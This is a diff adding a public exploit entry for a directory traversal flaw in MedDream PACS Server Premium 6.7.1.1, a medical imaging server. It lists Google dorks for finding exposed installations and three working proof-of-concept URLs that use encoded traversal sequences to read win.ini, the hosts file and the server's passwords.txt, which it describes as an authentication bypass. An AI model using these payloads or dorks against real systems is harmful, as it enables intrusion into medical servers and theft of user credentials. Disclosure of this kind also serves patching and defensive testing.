@@ -1,0 +1,17 @@
+# Exploit Title: Softneta MedDream PACS Server Premium 6.7.1.1 - Directory Traversal
+# Date: 2018-05-23
+# Software Link: https://www.softneta.com/products/meddream-pacs-server/downloads.html
+# Google Dork: inurl:pacs/login.php, inurl:pacsone/login.php, inurl:pacsone filetype:php home, inurl:pacsone filetype:php login
+# Version: MedDream PACS Server Premium 6.7.1.1
+# Category: webapps
+# Tested on: Windows 7 
+# Exploit Author: Carlos Avila
+# Contact: http://twitter.com/badboy_nt
+  
+# Proof of Concept
+
+http://TARGET/pacs/nocache.php?path=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows%5cwin.ini
+
+http://TARGET/Pacs/nocache.php?path=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cWindows\System32\drivers\etc\hosts
+
+http://TARGET/Pacs/nocache.php?path=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c\MedDreamPACS-Premium\passwords.txt (Attack Vector, obtain private information from users and passwords -Bypass Authentication- )
